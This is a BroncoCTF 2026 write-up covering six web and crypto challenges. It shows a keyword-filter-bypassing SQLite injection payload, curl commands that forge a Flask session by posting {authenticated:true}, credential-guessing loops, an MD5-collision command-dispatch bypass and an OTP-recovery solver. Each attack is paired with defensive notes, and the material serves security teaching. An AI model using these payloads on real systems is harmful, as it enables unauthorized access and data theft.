---
title: "BroncoCTF 2026 Web + Crypto Writeup: 6 Challenges Solved"
slug: "broncoctf-2026-web-crypto-writeup"
description: "Step-by-step BroncoCTF 2026 web and crypto writeup — four web challenges (Forbidden Archives: SQLite LIKE injection where the app leaks the query tail via a quote reflection and its naive keyword stripper turns ORDER into DER but the payload %') AND is_secret=1 -- uses the app's own visibility column against it; Lovely Login: robots.txt disallows /security (a leftover TODO-remove page spelling out password = reverse(username)) AND carries a base64 comment amVmZixzYXJhaCxhZG1pbixndWVzdA== = jeff,sarah,admin,guest with only admin:nimda returning the flag; Super Secure Server: /api/config exposes plaintext credentials so the browser can do a client-side password compare, and /login blindly trusts {authenticated:true} in the POST body, signs a session cookie, and returns the /flag redirect; Unblur Me: 500-derivative calculus gate is pure CSS filter:blur(20px) with the sharp PNG fetched unconditionally from /api/v1/internal/fetch-config-blob) and two crypto challenges (Blorg Multiplier: MD5-hex-digest command dispatcher with an uppercase show trap and a program feature that lets a registered command name recursively invoke a space-separated command list, weaponised by registering a 128-byte MD5 collision block as the program name so the sibling collision block matches by hash but not by string and falls through to the flag branch; Probably Unbreakable: XOR OTP whose key bytes are drawn only from a 64-character alphabet [a-zA-Z0-9_-], so each ciphertext byte becomes a membership test on p XOR c and 127 samples collapse every flag position to one candidate)."
date: 2026-07-16T10:55:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["BroncoCTF 2026"]
tags:
  - "broncoctf"
  - "broncoctf 2026"
  - "bronco ctf"
  - "ctf writeup"
  - "web"
  - "crypto"
  - "cryptography"
  - "sqlite injection"
  - "like injection"
  - "keyword stripping waf bypass"
  - "robots.txt leak"
  - "base64 comment leak"
  - "client-side authentication"
  - "api config credential leak"
  - "authenticated true trust"
  - "css blur access control"
  - "md5 collision"
  - "md5 hexdigest case bug"
  - "program command recursion bypass"
  - "otp key alphabet leak"
  - "membership test attack"
  - "flask signed session"
keywords:
  - "broncoctf 2026 web writeup"
  - "broncoctf 2026 crypto writeup"
  - "bronco ctf web writeup"
  - "forbidden archives sqlite injection writeup"
  - "lovely login robots.txt base64 writeup"
  - "super secure server api config writeup"
  - "unblur me css blur bypass writeup"
  - "blorg multiplier md5 collision writeup"
  - "probably unbreakable random.choices keystring writeup"
  - "sqlite like injection is_secret=1 comment bypass"
  - "keyword stripping waf order-becomes-der"
  - "flask session authenticated true trust bug"
  - "csrf-306 missing authentication login"
  - "css filter blur is not access control"
  - "md5 128-byte collision program name mismatch"
  - "random.choices keystring 64-char otp membership test"
  - "ctf step by step 2026"
toc: true
cover:
  image: "/images/articles/broncoctf-2026-web-crypto-writeup.png"
  alt: "BroncoCTF 2026 web + crypto writeup — six challenges solved covering a SQLite LIKE injection where the app leaks its own query tail via a quote reflection and its naive keyword stripper turns ORDER into DER but the payload uses the app's own is_secret column against it, a robots.txt that both disallows a leftover /security dev page revealing password = reverse(username) and carries a base64 comment decoding to the user list with only admin:nimda returning the flag, an /api/config endpoint exposing plaintext credentials for a client-side password compare paired with a /login endpoint that blindly trusts a client-supplied authenticated:true POST body, a 500-derivative calculus gate implemented as pure CSS filter:blur(20px) with the sharp PNG fetched unconditionally from an internal endpoint, a MD5-hex-digest command dispatcher with an uppercase show trap and a program feature that lets a 128-byte MD5 collision block register as a program name so its sibling collision block matches by hash but not by string and falls through to the flag branch, and an XOR one-time pad whose key bytes are drawn only from a 64-character alphabet so every ciphertext byte becomes a per-position membership test that collapses to one candidate after 127 samples"
---

**BroncoCTF 2026**'s web track (bronco flag prefix, Santa Clara University) was built entirely around one lesson repeated four different ways: **client-side checks are not access control**. Forbidden Archives blows past a naive keyword-stripping WAF by using the app's own `is_secret` column against it. Lovely Login puts the entire authentication story in `robots.txt` (a disallowed `/security` page + a base64 user list in a comment). Super Secure Server exposes plaintext credentials at `/api/config` for a client-side compare, and separately its `/login` endpoint blindly trusts a client-supplied `{"authenticated": true}` JSON body. Unblur Me implements a "solve 500 derivatives to unlock the image" gate as pure CSS `filter: blur(20px)` on an `<img>` that already has the sharp bytes. The crypto track pairs a repeat-encrypt XOR OTP whose 64-character key alphabet leaks structure into every sample (Probably Unbreakable) with a command dispatcher whose MD5-hash-vs-string mismatch inside a `program` recursion turns a classic 128-byte collision pair into an unlock primitive (Blorg Multiplier).

Handouts, per-challenge READMEs, and pure-stdlib solver scripts live at [Abdelkad3r/BroncoCTF-2026](https://github.com/Abdelkad3r/BroncoCTF-2026). This writeup covers the four web challenges (Forbidden Archives, Lovely Login, Super Secure Server, Unblur Me) and the two crypto challenges (Blorg Multiplier, Probably Unbreakable). The paired [BroncoCTF 2026 pwn + reverse writeup](/ctf-writeups/broncoctf-2026-pwn-reverse-writeup/) walks the three pwn challenges (Crab Trap seccomp-restricted ORW shellcode, Proper Pwning four-gate gets() chain, World's Hardestest Flag Roblox server-side Lua sandbox with write-over-read-protection) and four reverse challenges (Cat Simulator, C++ Unplugged song-title substitution, Dog Simulator ARM64 rhythm state machine with FNV-1a Z3 preimage, Mirror Mirror self-referential SHA-256 XOR loop).

## The six BroncoCTF 2026 web + crypto challenges

| Challenge | Category | Bug class / primitive | Flag |
|---|---|---|---|
| Forbidden Archives | Web | SQLite `LIKE` injection. Single-quote probe reflects the query tail: `') AND is_secret = 0 LIMIT 1`. Naive keyword stripper drops the literal substring `OR` (so `ORDER BY` becomes `DER BY`) and `UNION`, but leaves `AND` alone. Payload `%') AND is_secret=1 --` uses the app's own visibility column and comments out the trailing filter without either keyword. | `bronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}` |
| Lovely Login | Web | `robots.txt` carries two independent leaks: `Disallow: /security` points at a leftover TODO-remove dev page that spells out `password = reverse(username)`, and a base64 comment `amVmZixzYXJhaCxhZG1pbixndWVzdA==` decodes to `jeff,sarah,admin,guest`. All four credentials authenticate; only `admin:nimda` returns the flag body. | `bronco{R3v3rs1ng_1s_S3cure}` |
| Super Secure Server | Web | Two independent bugs. `/api/config` returns `{"username":"SuperSecretUser","password":"..."}` in plaintext to any anonymous caller because the browser needs it for a client-side compare. `/login` accepts a POST body of just `{"authenticated": true}` (no credentials at all), signs a Flask session cookie with `{loggedin:true, username:"SuperSecretUser"}`, and returns `{"redirect":"/flag","success":true}`. Bug #2 is strictly stronger. | `bronco{d0nt_3xp0se_p@ssw0rd5!}` |
| Unblur Me | Web | 500-derivative calculus gate rendered as pure CSS `filter: blur(20px)` on an `<img id="flag-image">`. `loadSecretImage()` fetches the sharp PNG unconditionally on page load from `/api/v1/internal/fetch-config-blob` (325 KB, no auth, no counter check). `curl` the endpoint, open the file, transcribe. Watch the `M@K3` vs `M@KE` glyph-recognition trap. | `bronco{1_wouldnt_m@k3_you_do_c@lculus}` |
| Blorg Multiplier | Crypto | Command dispatcher validates every input by `md5(input_bytes).hexdigest() in valid`. Two bugs: the `show` entry in `valid` is stored uppercase (`hexdigest()` returns lowercase, so `show` never matches), and the `program` command lets a caller register any command name plus a space-separated recursive command list without re-checking the outer `MAX_EDITS = 3` cap. Register a 128-byte MD5 collision block as the program name, then invoke the sibling collision block as the last command in the macro: same MD5 (passes hash check), different bytes (fails `user_in == program`), so execution falls through to the flag branch when `blorgs == 468`. Reach 468 via `increase, decrease, increase, increase, decrease, increase, decrease, none` (7 edits, only possible inside the program recursion). | `bronco{ple4s3_d0nt_l3ak_fl4g}` |
| Probably Unbreakable | Crypto | Repeat-encrypt XOR "OTP": `key = random.choices(keystring, k=len(flag)); enc = bytes(f ^ k for f, k in zip(flag, key))`. `keystring` is a fixed 64-char alphabet `[a-zA-Z0-9_-]`. Each ciphertext byte turns a candidate plaintext byte `p` into the membership test `c XOR p in keystring`. Ask the remote for 128 encryptions, brute-force printable-ASCII `p` at each position keeping only candidates that pass every sample. All 34 positions collapse to one candidate; zero ambiguity. | `bronco{4t_l3a5t_1mpr0b4b1e_th0ugh}` |

The six challenges are pulled together by a single defensive theme: **when the server delegates a security check to the client, or to a primitive that leaks structure, the check is not a check**. The Forbidden Archives keyword stripper is server-side but ignores SQL grammar entirely. Lovely Login's `robots.txt` disallow is a request-to-crawlers, not authorisation. Super Secure Server's password compare literally runs in JavaScript. Unblur Me's blur is a paint setting the browser applies to already-downloaded pixels. Blorg Multiplier's dispatcher hashes-then-compares rather than string-compares. Probably Unbreakable's OTP restricts key bytes to a public alphabet, so every ciphertext byte is a filter on the plaintext. In every case the check exists; it just doesn't do what the author thought it did.

## Methodology — probe the surface before touching the code

A pattern that worked across every web challenge in this set: **hit the obvious anonymous endpoints first**. `curl /robots.txt` reveals the `/security` disallow and the base64 user comment in Lovely Login. `curl /api/config` reveals the credentials in Super Secure Server (and the response is a JSON one-liner that names both fields). `curl /api/v1/internal/fetch-config-blob` returns the full-resolution PNG in Unblur Me regardless of the "solve 500 derivatives" gate. `?search='` returns the exception with the SQL tail in Forbidden Archives. Each one is a two-word invocation that reveals more attack surface than an hour of reading obfuscated JavaScript would.

For crypto: **read the constants**. Probably Unbreakable's `keystring` is 64 characters and printed in plaintext at the top of the file. Blorg Multiplier's `valid` set is six MD5 hex digests; one is uppercase and everything else lowercase, which by itself narrows the attack surface. Once the constants and their types are catalogued, the attack is usually a variation of "let me exploit the type / case / length / alphabet mismatch that the author didn't think about."

Per-challenge walkthroughs follow.

## Web track

### 1. Forbidden Archives

A SQLite-backed book search with a naive keyword filter. A one-quote probe leaks the query tail, and the payload sidesteps the filter by using `AND` and the app's own `is_secret` column.

#### Step 1 — Probe with a quote

```
?search='
The archives resist: The ink smears: unrecognized token: "') AND is_secret = 0 LIMIT 1"
```

Three facts fall out immediately: (a) backend is SQLite, (b) input is inside a `LIKE ('%...%')` pattern (the trailing `')` is the tell), (c) the server appends `AND is_secret = 0 LIMIT 1` to hide "forbidden" books. Likely full query:

```sql
SELECT title, author, description
FROM books
WHERE title LIKE ('%<search>%') AND is_secret = 0
LIMIT 1;
```

#### Step 2 — Confirm the WAF is naive substring stripping

Standard `OR 1=1` fails with a `near "1": syntax error`. Probing further:

```
?search=' ORDER BY 1 --
The ink smears: near "DER": syntax error
```

`ORDER` becoming `DER` in the error means the app strips the substring `OR` before running the query. Same treatment for `UNION`. That's not real SQL injection protection; it's a text filter that doesn't understand grammar. `AND` is untouched.

#### Step 3 — Turn the app's visibility column against itself

The leaked tail names the visibility flag: `is_secret`. Public books are `is_secret = 0`; the forbidden one must be `is_secret = 1`. Use only `AND` and a comment:

```
%') AND is_secret=1 --
```

Substituted:

```sql
SELECT title, author, description FROM books
WHERE title LIKE ('%%') AND is_secret=1 -- %') AND is_secret = 0
LIMIT 1;
```

`%%` matches any title; `AND is_secret=1` restricts to forbidden rows; `--` comments out the trailing filter; no `OR`, no `UNION`, so the keyword stripper passes.

URL-encoded:

```
/?search=%25%27%29+AND+is_secret%3D1+--
```

Response:

```
All of the World's Knowledge
Scribe: Unknown
bronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}
```

Per-challenge README + solver: [web/forbidden-archives](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/web/forbidden-archives).

The two general lessons: visibility checks belong in the authorisation layer (or the parameterised query itself), not tacked onto a string-concatenated SQL tail that a comment can defang; and keyword stripping is a pathological "WAF" pattern that trades off correctness for surface-level match, breaking legitimate queries (`ORDER BY`, `ORIGIN`, `FLOOR`) while leaving equivalents (`AND`, `INTERSECT`, subselects, blind time-based) intact. Real defence: parameterised queries end-to-end, and if authorisation logic exists in SQL at all, it should be enforced by the query builder API and not by string concatenation.

### 2. Lovely Login

A vanilla login card with the entire challenge stored in `robots.txt`. Two independent leaks: the disallowed dev page and a base64 comment.

#### Step 1 — Read `robots.txt` first

```
User-agent: *
Disallow: /security

# amVmZixzYXJhaCxhZG1pbixndWVzdA==
```

Four lines. The prompt's "please follow my wishes and do not scrape it..." literally points at this file. Two independent freebies:

- `Disallow: /security`: a disallowed URL is not a hidden URL; it's a "please skip me" note to well-behaved crawlers. Any `Disallow:` in `robots.txt` is worth `curl`ing directly.
- `# amVmZixzYXJhaCxhZG1pbixndWVzdA==`: the `==` shape is unmistakably base64. Decoding:

```
$ echo "amVmZixzYXJhaCxhZG1pbixndWVzdA==" | base64 -d
jeff,sarah,admin,guest
```

The full user table, handed over as a "comment."

#### Step 2 — Fetch the "TODO: remove" page

```
$ curl -sk https://broncoctf-lovely-login.chals.io/security
<h1>Internal Security Notes</h1>
<ul>
  <li>Passwords are derived from usernames</li>
  <li>Current implementation stores them backwards for obfuscation</li>
  <li>Planned upgrade: hashing + salting</li>
</ul>
<p><b>TODO:</b> remove this page before production deployment!</p>
```

Not encoded, not encrypted, not gated. Rule: `password = reverse(username)`. Credentials: `jeff:ffej`, `sarah:haras`, `admin:nimda`, `guest:tseug`.

#### Step 3 — Try all four; only admin returns the flag

```bash
for u in jeff sarah admin guest; do
    p=$(printf '%s' "$u" | rev)
    curl -sk -X POST https://broncoctf-lovely-login.chals.io/login \
         -H 'Content-Type: application/json' \
         -d "{\"username\":\"$u\",\"password\":\"$p\"}"
done
```

All four authenticate; three of them return a welcome message and a GIF. `admin:nimda` returns:

```html
<h2>Welcome, admin.</h2>
<pre>bronco{R3v3rs1ng_1s_S3cure}</pre>
```

Per-challenge README + solver: [web/lovely-login](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/web/lovely-login).

Three portable lessons. `robots.txt` is a triage map, not access control: every disallowed URL is usually the interesting one, and comment lines in `robots.txt` are frequently used to smuggle base64 blobs, old paths, hostnames, or TODO notes; read the whole file. `robots.txt disallow ≠ HTTP 403`: it only asks polite crawlers to skip a URL. Reversal is not obfuscation: `printf '%s' admin | rev` defeats the entire scheme. And the prompt's adjective "log in as the *right* user" is worth reading literally in CTF prompts, which almost never include throwaway adjectives.

### 3. Super Secure Server

Two independent bugs; either one is enough. Bug #1 is intended flavour (`/api/config` leaks credentials). Bug #2 is strictly stronger (`/login` blindly trusts `{"authenticated": true}`).

#### Step 1 — Read the login page's JS

```js
let leakedUser = "";
let leakedPass = "";
fetch('/api/config')
  .then(res => res.json())
  .then(data => {
    leakedUser = data.username;
    leakedPass = data.password;
  });

document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  if (u === leakedUser && p === leakedPass) {
    fetch('/login', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ authenticated: true })
    })
    .then(res => res.json())
    .then(data => {
      if (data.success) window.location.href = data.redirect;
    });
  }
});
```

Two independent bugs surface in one script: `/api/config` returns credential material to an anonymous fetch, and `/login` gets called with a hard-coded `{"authenticated": true}` body once the *client-side* compare passes. Either primitive is enough to defeat the app.

#### Step 2 — Bug #1: `/api/config` credential leak

```
$ curl -sk https://broncoctf-super-secure-server.chals.io/api/config
{"password":"rji32orj932r3209r233sqmet4v2cxbns8","username":"SuperSecretUser"}
```

Anonymous, HTTP 200, both fields plaintext. That's the intended solve path; the flag body (`d0nt_3xp0se_p@ssw0rd5`) is the author explicitly flagging this bug in the flag itself.

#### Step 3 — Bug #2: `/login` trusts the client

Bypass every credential check by posting the exact body the JS would post:

```bash
$ curl -sk -c ck -X POST https://broncoctf-super-secure-server.chals.io/login \
       -H 'Content-Type: application/json' -d '{"authenticated":true}'

HTTP/1.1 200 OK
Set-Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZSwidXNlcm5hbWUiOiJTdXBlclNlY3JldFVzZXIifQ.<sig>
{"redirect":"/flag","success":true}
```

The server:

- accepts the request with no credential material,
- signs a Flask session cookie asserting `loggedin:true, username:"SuperSecretUser"`,
- returns `{"redirect": "/flag", "success": true}`.

This is CWE-306 (missing authentication for critical function). The "critical function" is starting an authenticated session. Bug #2 doesn't need the `/api/config` leak; you never need to know the username.

#### Step 4 — Read the flag with the forged session

```bash
$ curl -sk -b ck https://broncoctf-super-secure-server.chals.io/flag
<h1>Welcome back, SuperSecretUser!</h1>
<p>Here is your flag: bronco{d0nt_3xp0se_p@ssw0rd5!}</p>
```

Flask sessions are signed but not encrypted by default. Base64-decoding the cookie payload:

```
$ echo eyJsb2dnZWRpbiI6dHJ1ZSwidXNlcm5hbWUiOiJTdXBlclNlY3JldFVzZXIifQ | base64 -d
{"loggedin":true,"username":"SuperSecretUser"}
```

That's the server's authoritative record of who we are, and it's just a copy of the claim we sent.

Per-challenge README + solver: [web/super-secure-server](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/web/super-secure-server).

The generalisable rule: whenever the client is doing the security check, the server isn't. Any time you see a page fetch `/api/config`, `/api/user`, or `/api/settings` and then run comparisons in JavaScript, the server has almost certainly delegated authentication to the browser. Test both halves: hit the config endpoint anonymously, and try to short-circuit the "success" branch of whatever the JS would call. And decode Flask session cookies whenever you get one back; the JSON is client-visible and often names the field the server will trust next.

### 4. Unblur Me

A 500-derivative calculus quiz gates access to a "top-secret" image. The gate is pure CSS; the image bytes are already in the browser on page load.

#### Step 1 — Is the blur an image thing or a CSS thing?

```html
<style>
  #flag-image {
    filter: blur(20px);
    transition: filter 0.5s ease;
  }
</style>
```

`filter: blur(20px)` is a CSS paint setting, not a bitmap operation. The browser downloads the sharp pixels and paints them blurred; the "unlock" JS just sets `flag.style.filter = "none"` when the counter passes 500. This is decoration masquerading as access control.

#### Step 2 — Find the image endpoint

```js
function loadSecretImage() {
  fetch('/api/v1/internal/fetch-config-blob')
    .then(response => response.blob())
    .then(blob => {
      const blobUrl = URL.createObjectURL(blob);
      document.getElementById('flag-image').src = blobUrl;
    });
}
```

Two noteworthy details: the endpoint name (`/api/v1/internal/fetch-config-blob`) reads as internal-network-only or authenticated, but naming is not authorisation; and `loadSecretImage()` runs at the bottom of the script, so the image is fetched *before* any derivatives are solved. The client has the flag bytes in memory the entire time.

#### Step 3 — `curl` the endpoint directly

```
$ curl -s -o flag.png \
    https://broncoctf-unblur-me.chals.io/api/v1/internal/fetch-config-blob
$ file flag.png
flag.png: PNG image data, 1648 x 928, 8-bit/color RGBA, non-interlaced
```

325 KB, full-resolution PNG. No auth cookie, no browser fingerprint, no counter check. Open the image and the flag reads out in stylised sans-serif ALL CAPS:

```
BRONCO{1_WOULDNT_M@K3_YOU_DO_C@LCULUS}
```

Case is lowercase (the event's flag prefix is `bronco{...}`). One glyph-recognition trap: the `3` in `M@K3` looks like `E` in the compressed image font; a first attempt of `m@ke` will be rejected.

```
bronco{1_wouldnt_m@k3_you_do_c@lculus}
```

Per-challenge README + solver: [web/unblur-me](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/web/unblur-me).

The two portable lessons: "blur" as CSS is decoration, not access control; any page that gates content behind a purely visual effect (blur, opacity, `display: none`, `visibility: hidden`, an SVG mask) has the underlying content already on the client, and the server has to be the one that refuses to ship the sensitive bytes; and endpoint naming is not authorisation; `/api/v1/internal/...` reads as though it might be locked down, but the route is just a Flask handler with no middleware in front. Treat suggestive path names as hints to try, not evidence they're locked down.

## Crypto track

### 5. Blorg Multiplier

A command dispatcher validated by MD5 hash lookup, with a `program` feature that recursively invokes commands. Two independent bugs (uppercase hash typo + MAX_EDITS bypass through recursion) combine with a classic 128-byte MD5 collision pair to reach the flag branch.

#### Step 1 — Read the valid set and spot the case bug

```python
valid = {
    "11198b294adbcf089f9d27990258fd22",  # increase
    "b0fe2606af48e49fd3746844798eb6a0",  # decrease
    "334c4a4c42fdb79d7ebc3e73b517e6f8",  # none
    "dbd73c2b545209688ed794c0d5413d5a",  # quit
    "a9c449d4fa44e9e5a41c574ae55ce4d9",  # program
    "A7DD12B1DAB17D25467B0B0A4C8D4A92",  # show, but uppercase
}
```

Python's `hashlib.md5(...).hexdigest()` returns lowercase hex. The uppercase `show` entry can never match a computed `hexdigest()`, so `show` is effectively removed from the valid set. That closes the obvious "just type `show`" path and forces us to find another way to reach the flag branch.

#### Step 2 — Read the program feature

```python
elif user_in == "program":
    program = input("What is the name of the new command? ")
    program_cmd = input("Which (space separated) commands would you like it to run: ")
    valid.add(hashlib.md5(program.encode("latin-1")).hexdigest())

elif user_in == program:
    for cmd in program_cmd.split(" "):
        handle_input(cmd.encode("latin-1"))
```

Two structural facts:

- `program` adds an arbitrary user-chosen MD5 hash to the `valid` set.
- Once registered, invoking the program name calls `handle_input()` recursively on each space-separated token, *without* the outer `edits > MAX_EDITS` check firing between nested calls.

That means a single top-level `program` call can execute an arbitrary number of `increase`/`decrease` operations. The `MAX_EDITS = 3` limit is only enforced at the top level.

#### Step 3 — Read the flag branch

```python
else:
    if blorgs == TARGET:  # TARGET = 468
        print(f"Wow! You earned the flag: {FLAG}")
```

The flag prints if the command is *valid by hash* but does not match any of the named commands (`increase`, `decrease`, `none`, `quit`, `program`, or the registered `program` string). We need a hash-valid command that isn't string-equal to any of those.

#### Step 4 — Reach 468 blorgs

State transitions:

```
increase: blorgs = (blorgs + 1) * 2
decrease: blorgs = (blorgs - 1) * 2
none:     blorgs = blorgs * 2
```

From `blorgs = 1`, the following 8-step sequence reaches `468`:

```
increase (1→4), decrease (4→6), increase (6→14), increase (14→30),
decrease (30→58), increase (58→118), decrease (118→234), none (234→468)
```

Eight commands; the top-level limit is 3. Only viable inside a program recursion.

#### Step 5 — Weaponise a 128-byte MD5 collision pair

Classic Wang-Yu style MD5 collision blocks: two 128-byte messages `collision_a` and `collision_b` with the same MD5 (`79054025255fb1a26e4bc422aef54eb4`) but different bytes. Register `collision_a` as the program name. `valid` now contains their shared MD5. Inside the macro, the last token is `collision_b`. It passes the `md5(...).hexdigest() in valid` check, but `user_in == program` fails because the bytes differ. Execution falls through the elif chain and lands in the final `else`, which checks `blorgs == 468` and prints the flag.

#### Step 6 — Encode the collision for `input()`

The remote is line-oriented `input()`. The checker's decode is `bytes_in.decode("latin-1")`, so each raw byte `b` in the collision maps to Unicode codepoint `chr(b)`, and sending that string as UTF-8 lets the checker's Latin-1 encode reconstruct the original collision bytes. One byte in the standard pair is `0x0d` (`\r`), and Python's `input()` splits on `\n` while preserving `\r` as data, so no custom collision generation is required.

#### Step 7 — Fire the payload

Top-level sequence: (a) invoke `program`, register `collision_a` as name, macro body = `increase decrease increase increase decrease increase decrease none collision_b`; (b) invoke `collision_a` to trigger the recursion.

```
Running: increase
Running: decrease
Running: increase
Running: increase
Running: decrease
Running: increase
Running: decrease
Running: none
Running: <md5-collision block>
Wow! You earned the flag: bronco{ple4s3_d0nt_l3ak_fl4g}
```

Per-challenge README + solver: [crypto/blorg-multiplier](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/crypto/blorg-multiplier).

The generalisable lessons compound. MD5 has been chosen-prefix-collision-broken since 2004 (Wang) and full-prefix-collision-broken since 2005 (Wang-Yu), which means any security check that treats "same MD5" as "same message" is defeated by a two-message pair whose creation is now a laptop-scale computation. But that's rarely the *whole* bug; the useful shape here is the dispatcher's separate hash-equality check and string-equality check, and specifically the fact that a valid hash routes past every named-command branch into a final catch-all that prints the flag. When a hash-based lookup and a string-based lookup exist side by side over the same input, an attacker with a collision has a splittable input where one half satisfies the hash check and the other half doesn't satisfy the string check; that's the whole primitive. The fix is to use HMAC-SHA256 for authenticity and to make sure named-command branches cover every valid hash (or that the else branch doesn't print flags). The uppercase `show` typo is a bonus lesson: `hexdigest()` returns lowercase; store hashes in a canonical form and normalise on lookup.

### 6. Probably Unbreakable

A repeat-encrypt XOR "OTP" whose key alphabet is restricted to 64 printable characters. Every ciphertext byte becomes a membership test on the plaintext byte; 127 samples collapse each position to one candidate.

#### Step 1 — Read the encoder

```python
keystring = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

def encrypt_flag(n):
    for _ in range(n):
        key = random.choices(keystring, k=len(flag))
        enc = bytes([ord(f) ^ ord(k) for f, k in zip(flag, key)])
        print(enc.hex())
```

Fresh random key per encryption. If key bytes were uniform over `0..255`, this would actually be a one-time pad and ciphertexts would leak nothing. But the key alphabet is public and only 64 bytes wide. That alphabet is exactly what an attacker gets to use as a filter.

#### Step 2 — Turn each ciphertext byte into a membership test

For a single ciphertext byte `c` at position `i` and a candidate plaintext byte `p`:

```
p is possible only if (c XOR p) in keystring
```

One ciphertext leaves many candidates; many ciphertexts of the same plaintext position intersect down to few. The 64/256 pass rate per sample is ~25%, so `N` independent samples collapse the candidate set by roughly `4^N`; after ~13 samples the expected candidate count per position drops below 1.

#### Step 3 — Collect samples

The menu enforces `a + b + c <= 20000` across the three request types; 128 flag encryptions is negligible.

```
How many list-scrambles do you want? 0
How many random-letter-pickings do you want? 0
How many flag encryptions do you want? 128
```

Save the 127 returned hex lines to `ciphertexts.txt`. (The remote returned 127 for a request of 128, an off-by-one in the loop, irrelevant to the attack.)

#### Step 4 — Solve position-by-position

```python
KEY_BYTES = set(map(ord, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"))
PRINTABLE = list(range(0x20, 0x7f))

def candidates_for_position(ciphertexts, i):
    return [p for p in PRINTABLE
            if all((ct[i] ^ p) in KEY_BYTES for ct in ciphertexts)]

flag_bytes = bytearray()
for i in range(flag_len):
    cands = candidates_for_position(ciphertexts, i)
    assert len(cands) == 1, (i, cands)
    flag_bytes.append(cands[0])
```

For 127 samples, every one of the 34 flag positions resolves to exactly one candidate. Zero ambiguity.

```
[+] ciphertexts: 127
[+] flag length: 34
[+] ambiguous positions: 0
[+] flag: bronco{4t_l3a5t_1mpr0b4b1e_th0ugh}
```

Per-challenge README + solver: [crypto/probably-unbreakable](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/crypto/probably-unbreakable).

The general takeaway: a one-time pad requires (a) key material at least as long as the plaintext, (b) uniformly random over the full byte alphabet, (c) never reused. Any constraint on the key distribution turns the pad into a distinguisher: restrict to 64 characters and the ciphertext leaks the plaintext through membership tests; restrict to ASCII printable and it leaks bit-7 = 0; use a PRNG instead of a CSPRNG and the *sequence* of keys leaks even when each individual key looks random. This challenge is a laboratory version of a real-world class of bugs: any application that uses `random.choice(string.ascii_letters + string.digits)` for a "random key" in a stream construction leaks structure the same way. The fix is `secrets.token_bytes(n)` (or `os.urandom(n)`), which draws from `0..255` uniformly, and, separately, never re-encrypt the same plaintext under distinct keys with a low-entropy key alphabet.

## Cross-cutting defender notes

Six patterns recur across the BroncoCTF 2026 web + crypto tracks and translate directly into code-review or triage heuristics.

**Validators must run on the same bytes the sink consumes.** Forbidden Archives's keyword stripper deletes the literal substring `OR` from user input before building SQL, but SQLite doesn't parse tokens the same way a substring search does: `ORDER BY` becomes `DER BY` (invalid), and payloads that avoid `OR` and `UNION` still express useful predicates. The general anti-pattern is any validator that operates on a normalised or filtered form of the input while the sink consumes the raw form. Real defence: parameterised queries end-to-end, and if authorisation logic exists in SQL at all, it should be enforced by the query builder's `WHERE` API (not by string concatenation) and by the authorisation layer above the ORM.

**`robots.txt` is a triage map, not access control.** Every `Disallow:` entry in `robots.txt` is an *invitation* to `curl` that URL. Every comment line in `robots.txt` is a candidate for smuggling base64 blobs, deprecated hostnames, TODO notes, or user tables. Lovely Login's four-line `robots.txt` carried both a disallowed dev-only page and the entire user list. The general rule: if you don't want a URL discovered, don't list it in a file that public crawlers routinely fetch. Return `HTTP 403` (or better yet, don't route the URL at all in production) if the endpoint isn't public.

**Client-side authentication is not authentication.** Super Secure Server's `/api/config` sends credential material to any anonymous browser because the *browser* runs the password compare. Its `/login` accepts a POST body of `{"authenticated": true}` because the client is expected to only send that body when the client-side compare has passed. Both bugs are the same class: the server delegates a security decision to a client it doesn't control. The fix is trivial and mechanical: run credential comparisons server-side, sign session tokens only after actually verifying credentials, and treat any client-supplied `authenticated:` / `admin:` / `role:` / `is_admin:` field in a request body as untrusted data that has to be validated against a server-side store before it means anything.

**Visual gates aren't gates.** Unblur Me's `filter: blur(20px)` is a CSS paint setting on already-downloaded PNG bytes. `display: none`, `visibility: hidden`, `opacity: 0`, SVG masks, canvas overlays, and any React-conditional-render that operates on data already fetched from the API are all in the same class: the payload is on the client, and any user with dev-tools access (or `curl`) can read it. The general rule: if content is sensitive, the server must not ship it until the user is authenticated to access it. There is no valid "we send it but the browser doesn't show it" pattern for real access control.

**Hash-based equality checks are broken by design in the presence of collisions.** Blorg Multiplier's `md5(x).hexdigest() in valid` treats "same MD5" as "same command". MD5 has been full-collision-broken since 2005 (Wang-Yu) and chosen-prefix-collision-broken since 2009 (Stevens et al.), and generating a 128-byte colliding pair takes seconds on a laptop. SHA-1 is broken since SHAttered (2017). Any code using MD5 or SHA-1 for identity, authenticity, or dispatch is broken; use SHA-256 for identity and HMAC-SHA256 for authenticity. And even with a strong hash, if the dispatcher does both a hash-equality check and a string-equality check on the same input, the *gap* between them is exploitable regardless of hash strength; always make sure the "valid but no branch matched" path doesn't leak secrets.

**Restricted-alphabet key material collapses OTP security.** Probably Unbreakable's `random.choices(keystring, k=len(flag))` draws from a 64-char alphabet, so each ciphertext byte is a per-position membership filter on the plaintext. `random.choice` over a printable alphabet is the same class of bug that shows up in real-world token generators, "random" session IDs, "random" password reset tokens, and API keys made with `''.join(random.choice(string.ascii_letters) for _ in range(N))`. The fix is `secrets.token_bytes(n)` or `secrets.token_urlsafe(n)`: draws from `0..255` uniformly and lets the developer choose an alphabet only for encoding, not for entropy. And never encrypt the same plaintext multiple times under distinct keys with a low-entropy key alphabet; if you're going to do that, use an AEAD (AES-GCM, ChaCha20-Poly1305) with a random nonce per message.

## Frequently asked questions

### What is BroncoCTF 2026?

